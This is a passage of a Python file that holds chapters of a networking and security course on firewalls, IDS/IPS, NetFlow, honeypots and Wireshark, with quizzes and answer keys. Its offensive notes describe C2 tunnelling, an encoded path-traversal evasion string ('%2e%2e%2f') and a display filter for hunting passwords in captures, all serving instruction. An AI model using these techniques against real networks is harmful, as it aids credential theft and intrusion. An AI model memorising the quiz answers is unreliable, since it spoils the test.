                            "Decoupling the centralized Control Plane (routing decision logic) from the distributed Data Plane (packet forwarding hardware).",
                            "Splitting IPv4 into IPv2.",
                            "Disabling fiber optic cables."
                        ],
                        "answer": 1,
                        "explanation": "SDN removes route calculation from individual switches (Control Plane) and centralizes it in an intelligent software controller, while switches simply execute fast packet forwarding (Data Plane)."
                    }
                }
            ]
        },

        # CH 22
        {
            "id": "22",
            "module": "05 / ENTERPRISE & DEFENCE",
            "title": "Network defence",
            "desc": "Compare firewalls, IDS, IPS, and tunnel visibility.",
            "screensCount": 4,
            "sourceRange": "SOURCE 107-110",
            "simulator": "firewall-ids-sim",
            "badge": "Active Defense",
            "screens": [
                {
                    "screenNumber": 1,
                    "globalSource": 107,
                    "title": "Firewall Evolution: Packet Filters to NGFW",
                    "summary": "1st Gen Stateless, 2nd Gen Stateful, 3rd Gen Application, and Next-Generation Firewalls.",
                    "concept": "- 1st Gen (Stateless Packet Filter): Evaluates individual packets against static IP/Port rules. Easily tricked by forged ACK flags.\n- 2nd Gen (Stateful Inspection): Maintains connection state tables. Validates handshakes and permits return traffic automatically.\n- 3rd Gen (Application Proxy): Terminates connections and inspects full application payload.\n- Next-Gen Firewall (NGFW): Integrates stateful inspection, Deep Packet Inspection (DPI), Application Identification (App-ID, e.g. allowing Facebook chat but blocking file upload), User-ID (Active Directory user mapping), TLS decryption, and real-time threat intelligence feeds.",
                    "cyberLens": {
                        "offensive": "Protocol Tunneling & Port Hopping: Malware runs command-and-control over standard port 80 or 443 using non-HTTP protocols. Traditional firewalls allow it because port 80 is open; NGFWs detect non-HTTP payloads and block them.",
                        "defensive": "Deploy App-ID policies that require traffic on port 443 to strictly conform to valid SSL/TLS and HTTP specifications."
                    },
                    "keyPoints": [
                        "Stateless looks at packets in isolation; stateful tracks connections.",
                        "NGFW identifies applications regardless of what port they run on.",
                        "Default-deny rule must always sit at the bottom of every firewall policy."
                    ],
                    "quiz": {
                        "question": "How does a Next-Generation Firewall (NGFW) with Application Identification (App-ID) defeat an attacker attempting to run an SSH shell over TCP port 80?",
                        "options": [
                            "It cannot detect it because port 80 is permitted.",
                            "It inspects the payload protocol signatures and detects that the protocol is SSH rather than HTTP, blocking the session regardless of the port number used.",
                            "It disconnects the user's monitor.",
                            "It reboots the computer."
                        ],
                        "answer": 1,
                        "explanation": "Traditional firewalls only check port numbers (80 = allow). An NGFW performs deep packet inspection on the payload: it recognizes the SSH protocol handshake and blocks it because it does not match approved HTTP traffic."
                    }
                },
                {
                    "screenNumber": 2,
                    "globalSource": 108,
                    "title": "IDS vs IPS: Detection vs Inline Prevention",
                    "summary": "Promiscuous mode taps vs Inline bridges, Signature vs Anomaly analysis.",
                    "concept": "- Intrusion Detection System (IDS): Passive out-of-band device connected to a switch SPAN port or network TAP.\n  - Sniffs traffic copies in Promiscuous Mode.\n  - Analyzes packets and generates alerts to the SIEM.\n  - ZERO latency impact on network traffic, but cannot prevent attacks in real time.\n- Intrusion Prevention System (IPS): Inline security appliance sitting physically in the path of packets (acting like a bridge).\n  - Inspects packets in real time.\n  - Can actively DROP malicious packets, reset TCP sessions, and ban attacking IP addresses.\n  - Slight latency impact; misconfigured rules (false positives) can accidentally drop legitimate business traffic.",
                    "cyberLens": {
                        "offensive": "IDS/IPS Evasion: Attackers use packet fragmentation, polymorphic shellcode, out-of-order delivery, and URL encoding (`%2e%2e%2f` for `../`) to evade static signatures.",
                        "defensive": "Modern IPS engines use stream reassembly and protocol normalization before running signature and anomaly detection algorithms."
                    },
                    "keyPoints": [
                        "IDS alerts after the fact; IPS blocks in real time.",
                        "Signature-based catches known exploits; Anomaly-based catches zero-days.",
                        "SPAN ports mirror traffic to IDS; IPS must sit inline."
                    ],
                    "quiz": {
                        "question": "What is the primary operational risk of deploying an Intrusion Prevention System (IPS) in active inline blocking mode?",
                        "options": [
                            "It uses too much electrical power.",
                            "A false positive rule can accidentally drop critical legitimate business traffic and disrupt business operations.",
                            "It cannot inspect IP addresses.",
                            "It turns off all computer screens."
                        ],
                        "answer": 1,
                        "explanation": "Because an IPS sits directly inline and actively drops packets, a poorly tuned signature resulting in a false positive will block legitimate customer transactions or critical server communications."
                    }
                },
                {
                    "screenNumber": 3,
                    "globalSource": 109,
                    "title": "Network Telemetry: NetFlow, IPFIX, & Zeek",
                    "summary": "Flow metadata vs full packet captures: scalable enterprise visibility.",
                    "concept": "- Full Packet Capture (PCAP): Records every single byte over the wire (Wireshark/tcpdump). 100% visibility, but storing full PCAP at 10 Gbps requires terabytes of storage per day.\n- NetFlow / IPFIX: Exports connection summary metadata (the 'phone bill' of the network):\n  - Records: Src IP, Dst IP, Src Port, Dst Port, Protocol, Packet Count, Byte Count, Duration, Flags.\n  - 99% smaller storage footprint than PCAP, enabling months of searchable traffic history.\n- Zeek (formerly Bro): Bridges the gap by generating structured behavioral transaction logs for DNS, HTTP, SSL, and SSH without storing massive payload data.",
                    "cyberLens": {
                        "offensive": "Beaconing Detection: Malware C2 agents communicate on regular intervals (e.g., checking in every 60 seconds). Security analysts identify C2 beacons by querying NetFlow logs for recurring small-byte periodic flows.",
                        "defensive": "NetFlow flow anomaly detection identifies massive sudden outbound data exfiltration in seconds."
                    },
                    "keyPoints": [
                        "PCAP is the whole recording; NetFlow is the phone bill summary.",
                        "NetFlow tracks who spoke to whom, when, and how much data was exchanged.",
                        "Zeek extracts rich application-layer metadata from live streams."
                    ],
                    "quiz": {
                        "question": "What key difference makes NetFlow/IPFIX telemetry more practical than full packet capture (PCAP) for multi-month network monitoring in large enterprises?",
                        "options": [
                            "NetFlow records only connection metadata (IPs, ports, byte counts) rather than raw payloads, requiring vastly less storage space.",
                            "NetFlow works without electricity.",
                            "PCAP cannot be opened on computers.",
                            "NetFlow automatically fixes broken cables."
                        ],
                        "answer": 0,
                        "explanation": "At high enterprise speeds, storing every packet payload (PCAP) exhausts storage within hours. NetFlow stores only the metadata summary (5-tuple, bytes, packets), allowing organizations to retain months of flow history."
                    }
                },
                {
                    "screenNumber": 4,
                    "globalSource": 110,
                    "title": "Deception Technology: Honeypots & Canary Tokens",
                    "summary": "High-interaction vs Low-interaction honeypots, honeytokens, and active defense traps.",
                    "concept": "Deception technology turns the network into a minefield for attackers:\n- Honeypot: A decoy system intentionally deployed with vulnerabilities and zero legitimate business function.\n  - Because legitimate employees have zero reason to ever touch it, ANY connection attempt to a honeypot is 100% guaranteed to be malicious!\n  - Low-Interaction (e.g. Cowrie, Dionaea): Emulates vulnerable services (SSH, SMB) to log credentials and malware samples.\n  - High-Interaction: Real VM running real OS in a heavily monitored, sandboxed containment network.\n- Canary Tokens: Decoy credentials or fake files with embedded tracking webhooks. If an attacker opens the file or uses the credentials, an immediate high-priority alert fires.",
                    "cyberLens": {
                        "offensive": "Honeypot Evasion: Attackers inspect system uptime, hardware MAC vendors, CPU thermal sensors, and registry keys to detect if they landed inside a virtualized honeypot sandbox before deploying their primary payload.",
                        "defensive": "Scattering honeytokens (fake AWS keys, bogus database credentials in config files) creates high-fidelity tripwires that alert your SOC the instant an attacker starts enumerating files."
                    },
                    "keyPoints": [
                        "Honeypots have zero false positives: any traffic touching them is suspicious.",
                        "Canary tokens act as digital tripwires across endpoints and networks.",
                        "Active defense shifts the asymmetric advantage from attacker to defender."
                    ],
                    "quiz": {
                        "question": "Why do security operations centers (SOCs) value alerts triggered by Honeypots far more than standard IDS alerts?",
                        "options": [
                            "Because honeypots never send emails.",
                            "Because honeypots have zero legitimate business use, so any traffic or connection attempt touching them has a near 0% false positive rate.",
                            "Because honeypots are written in Python.",
                            "Because honeypots automatically arrest the hacker."
                        ],
                        "answer": 1,
                        "explanation": "Since legitimate users and systems have no business touching a honeypot, any activity on it is an immediate high-fidelity indicator of reconnaissance, compromise, or malicious scanning."
                    }
                }
            ]
        },

        # CH 23
        {
            "id": "23",
            "module": "05 / ENTERPRISE & DEFENCE",
            "title": "Wireshark: read your own traffic",
            "desc": "Bring the layers together using a small capture from your own local HTTP demo.",
            "screensCount": 4,
            "sourceRange": "SOURCE 111-114",
            "simulator": "wireshark-simulator",
            "badge": "Packet Forensics",
            "screens": [
                {
                    "screenNumber": 1,
                    "globalSource": 111,
                    "title": "The Wireshark 3-Pane Architecture",
                    "summary": "Mastering the Packet List, Packet Details tree, and Hex Dump view.",
                    "concept": "Wireshark is the world's foremost network protocol analyzer, structured into three coordinated panes:\n1. Top Pane (Packet List): Displays all captured packets in chronological order (Packet #, Time, Source, Destination, Protocol, Length, Info summary).\n2. Middle Pane (Packet Details): Collapsible hierarchical tree dissecting the selected packet layer by layer (Frame -> Ethernet II -> IPv4 -> TCP/UDP -> Application Layer).\n3. Bottom Pane (Hex Dump): The raw binary bytes of the packet displayed in hexadecimal on the left and ASCII representation on the right. Clicking any field in the middle pane highlights the exact corresponding bytes in the hex dump!",
                    "cyberLens": {
                        "offensive": "Credential Harvesting: Sniffing local cleartext traffic (FTP, HTTP, Telnet) reveals usernames and passwords highlighted directly in the ASCII hex pane.",
                        "defensive": "Digital Forensics: Analysts inspect the Hex Dump to extract embedded malware binaries, carving out malicious executable signatures (e.g. `MZ` header = 0x4D 0x5A)."
                    },
                    "keyPoints": [
                        "The 3 panes coordinate: clicking a field in Details highlights its bytes in Hex.",
                        "Packets are dissected strictly according to OSI/DoD protocol hierarchy.",
                        "Colored packet rows indicate protocols (TCP=light purple, UDP=light blue, DNS=light blue, Errors=black/red)."
                    ],
                    "quiz": {
                        "question": "What happens in Wireshark when you click on a specific header field (such as Time to Live) in the middle Packet Details pane?",
                        "options": [
                            "Wireshark deletes the packet.",
                            "The corresponding exact raw hexadecimal and ASCII bytes are highlighted in the bottom Hex Dump pane.",
                            "The router reboots.",
                            "The packet is retransmitted onto the wire."
                        ],
                        "answer": 1,
                        "explanation": "Wireshark synchronizes the panes: selecting any parsed field in the middle details tree immediately highlights the exact binary bytes representing that field in the bottom hex dump."
                    }
                },
                {
                    "screenNumber": 2,
                    "globalSource": 112,
                    "title": "Capture Filters vs Display Filters",
                    "summary": "Berkeley Packet Filters (BPF) before capture vs post-capture analysis expressions.",
                    "concept": "- Capture Filters (BPF - Berkeley Packet Filter syntax):\n  - Applied BEFORE packets are captured into memory by the libpcap/WinPcap driver.\n  - Reduces CPU and memory load on busy links.\n  - Syntax: `host 192.168.1.50 and port 80`, `not broadcast and not multicast`.\n  - Once dropped, discarded packets cannot be recovered.\n- Display Filters (Wireshark evaluation syntax):\n  - Applied AFTER packets are captured to filter what is shown on screen.\n  - Non-destructive: Hiding packets does not delete them.\n  - Syntax:\n    - `ip.addr == 192.168.1.1`\n    - `tcp.flags.syn == 1 && tcp.flags.ack == 0` (filters initial SYN packets)\n    - `http.request.method == \"POST\"`\n    - `dns.flags.response == 0` (DNS queries only).",
                    "cyberLens": {
                        "offensive": "Filtering Out Noise: In a multi-gigabyte capture, attackers and analysts quickly isolate targets using surgical display filters like `frame contains \"password\"`.",
                        "defensive": "Threat hunting filters like `tcp.analysis.retransmission` detect link degradation, while `tcp.flags.reset == 1` finds terminated sessions."
                    },
                    "keyPoints": [
                        "Capture filters drop before recording; display filters hide on screen.",
                        "Green filter bar means valid syntax; red bar means syntax error.",
                        "Display filters allow deep field-level Boolean logic (`&&`, `||`, `!`)."
                    ],
                    "quiz": {
                        "question": "Which Wireshark display filter will isolate ONLY initial TCP SYN packets sent to start new connections (excluding SYN-ACK packets)?",
                        "options": [
                            "tcp.port == 80",
                            "tcp.flags.syn == 1 && tcp.flags.ack == 0",
                            "ip.proto == 6",
                            "http"
                        ],
                        "answer": 1,
                        "explanation": "Initial connection initiation packets have the SYN flag set (1) and the ACK flag cleared (0). SYN-ACK responses have both flags set."
                    }
                },
                {
                    "screenNumber": 3,
                    "globalSource": 113,
                    "title": "Following TCP Streams & Payload Reconstruction",
                    "summary": "Reassembling scattered segments into human-readable conversations.",
                    "concept": "A single web page or file download is fragmented across dozens or thousands of individual TCP packets.\n- Following TCP Stream (`Right Click Packet -> Follow -> TCP Stream`):\n  - Wireshark reassembles all out-of-order sequence numbers, strips lower-layer Ethernet/IP/TCP headers, and displays the complete bidirectional conversation in a single clean ASCII/Hex window.\n  - Text sent by Client is colored RED.\n  - Text sent by Server is colored BLUE.\n  - Perfect for viewing raw HTTP requests/responses, FTP credentials, and Telnet sessions as they happened in real time.",
                    "cyberLens": {
                        "offensive": "Credential Extraction: Right-clicking any HTTP POST packet and selecting 'Follow TCP Stream' immediately reveals plaintext submitted form fields (username, password, credit card) without needing to inspect individual packets.",
                        "defensive": "Forensic reconstruction: Incident responders follow streams to reconstruct files dropped by malware or extract attacker commands executed in compromised webshells."
                    },
                    "keyPoints": [
                        "Follow TCP Stream reassembles the full bidirectional byte stream.",
                        "Red text is client outbound; Blue text is server inbound.",
                        "Wireshark automatically assigns each unique TCP connection a stream index (`tcp.stream eq 0`)."
                    ],
                    "quiz": {
                        "question": "When using Wireshark's 'Follow TCP Stream' feature, what do the Red and Blue colored texts represent by default?",
                        "options": [
                            "Red is corrupted packets, Blue is healthy packets.",
                            "Red represents data sent from Client to Server; Blue represents data sent from Server to Client.",
                            "Red is IPv4, Blue is IPv6.",
                            "Red is encrypted, Blue is cleartext."
                        ],
                        "answer": 1,
                        "explanation": "Wireshark uses Red for client requests (outbound from initiator) and Blue for server responses (inbound return), making conversational flow effortless to read."
                    }
                },
                {
                    "screenNumber": 4,
                    "globalSource": 114,
                    "title": "Bringing It All Together: The Ultimate PCAP Investigation",
                    "summary": "Correlating Layer 2 ARP, Layer 3 Routing, Layer 4 TCP handshakes, and Layer 7 Application data.",
                    "concept": "In this final capstone screen, we correlate an entire real-world network incident through the lens of all 23 chapters:\n1. ARP resolution: Host discovers gateway MAC (Ch 07).\n2. DNS Query: Host resolves `bank-login.com` to public IP (Ch 16).\n3. Routing & NAT: Packet leaves local subnet, translates via PAT (Ch 08-11).\n4. TCP 3-Way Handshake: SYN -> SYN-ACK -> ACK synchronizes ISNs (Ch 12-13).\n5. TLS 1.3 Negotiation: Client Hello, Server Hello, ECDHE shared secret (Ch 15).\n6. HTTP Application Request: Encrypted GET with cookie and security headers (Ch 17-18).\n7. Defense Inspection: Firewall and IDS inspect telemetry, validating against threat intelligence (Ch 21-22).\nYou now understand every layer of computing from electrical bits on copper to application session tokens!",
                    "cyberLens": {
                        "offensive": "A cybersecurity professional who understands the full network stack can spot anomalies that automated tools miss, construct stealthy exploits, and penetrate deep corporate architectures.",
                        "defensive": "A master network defender can trace an incident from a single SIEM alert back to the exact packet offset, reverse the attack, patch the vulnerability, and protect global infrastructure."
                    },
                    "keyPoints": [
                        "Networking is the foundational language of cybersecurity.",
                        "Every cyber incident leaves an immutable record on the wire.",
                        "Mastery of these 23 chapters provides the complete foundation for any security career."
                    ],
                    "quiz": {
                        "question": "What is the single most definitive source of truth during a digital forensic incident investigation when host logs have been deleted by an attacker?",
                        "options": [
                            "The attacker's confession.",
                            "Raw Network Packet Captures (PCAPs) captured out-of-band on network taps and core switches.",
                            "The computer wallpaper.",
                            "A reboot of the router."
                        ],
                        "answer": 1,
                        "explanation": "Attackers can wipe Windows Event Logs and delete bash history on a compromised endpoint, but they cannot delete raw packets captured out-of-band by physical network TAPs or switch SPAN ports."
                    }
                }
            ]
        }
    ]

print("Modules 4 and 5 ready.")
